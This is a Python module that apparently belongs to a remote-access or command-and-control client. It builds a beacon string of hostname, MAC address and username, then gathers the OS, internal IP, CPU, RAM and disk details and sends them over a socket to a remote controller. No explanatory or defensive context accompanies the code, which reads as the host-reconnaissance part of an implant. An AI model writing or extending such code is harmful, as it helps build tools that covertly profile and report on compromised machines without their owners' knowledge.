import socket
import os
import platform
import uuid
try:
    import psutil
except ImportError:
    psutil = None
    print("[-] psutil library not found. Sysinfo/process functionality may be limited. Run: pip install psutil")

def get_initial_info():
    hostname = socket.gethostname()
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
    return f"{hostname},{mac_address},{username}"

def gather_detailed_sysinfo(sock):
    from ..communication import send_data
    info = {}
    try:
        info['platform_system'] = platform.system()
        info['platform_release'] = platform.release()
        info['platform_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        try:
            info['internal_ip'] = socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            info['internal_ip'] = "N/A"
        info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
        info['processor'] = platform.processor()
        info['python_version'] = platform.python_version()
        info['user'] = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
        if psutil:
            vm = psutil.virtual_memory()
            info['ram_total_gb'] = f"{vm.total / (1024**3):.2f} GB"
            info['ram_available_gb'] = f"{vm.available / (1024**3):.2f} GB"
            info['ram_used_percentage'] = f"{vm.percent}%"
            disk_usage = psutil.disk_usage('/')
            info['disk_total_gb'] = f"{disk_usage.total / (1024**3):.2f} GB"
            info['disk_used_gb'] = f"{disk_usage.used / (1024**3):.2f} GB"
            info['disk_free_gb'] = f"{disk_usage.free / (1024**3):.2f} GB"
            info['disk_used_percentage'] = f"{disk_usage.percent}%"
            info['cpu_logical_cores'] = psutil.cpu_count(logical=True)
            info['cpu_physical_cores'] = psutil.cpu_count(logical=False)
            info['cpu_total_usage_momentary'] = f"{psutil.cpu_percent(interval=0.1)}%"
        else:
            info['psutil_status'] = "psutil library not available."
        send_data(sock, {"type": "sysinfo_result", "data": info})
    except Exception as e:
        send_data(sock, {"type": "sysinfo_result", "error": str(e)})